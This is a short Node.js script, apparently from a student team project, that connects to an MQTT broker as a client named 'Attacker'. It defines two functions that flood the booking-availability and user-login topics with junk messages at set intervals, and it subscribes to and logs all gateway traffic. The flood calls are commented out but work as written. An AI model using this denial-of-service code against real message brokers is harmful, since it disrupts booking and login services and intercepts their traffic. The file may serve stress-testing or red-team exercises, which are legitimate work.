require("dotenv").config();
const mqtt = require("mqtt");

const client = mqtt.connect({
  clientId: `Attacker`,
  hostname: process.env.BROKER_URI,
  username: process.env.BROKER_USERNAME,
  password: process.env.BROKER_PASSWORD,
  protocol: "wss",
});

const DDoS_Bookings = (n, timeout) => {
  for (let i = 0; i < n + 1; i++) {
    setInterval(() => {
      const msg = {
        "T34m-S1xt33n": "ROFL",
      };
      client.publish("api/bookings/available", JSON.stringify(msg));
    }, timeout);
  }
};

const DDoS_Users = (n, timeout) => {
  for (let i = 0; i < n + 1; i++) {
    setInterval(() => {
      const msg = {
        "T34m-S1xt33n": "ROFL",
      };
      client.publish("api/users/login", JSON.stringify(msg));
    }, timeout);
  }
};



client.on("connect", () => {
  console.log("connected!")
  client.subscribe("api/gateway/#")
})

client.on("message", (t, m) => {
  const msg = JSON.parse(m.toString());
  console.log(msg)
})

const bursts = 10; // number of messages to send in close to one go
const interval = 100; // time between bursts in ms

//DDoS_Bookings(bursts, interval)
//DDoS_Users(bursts, interval)
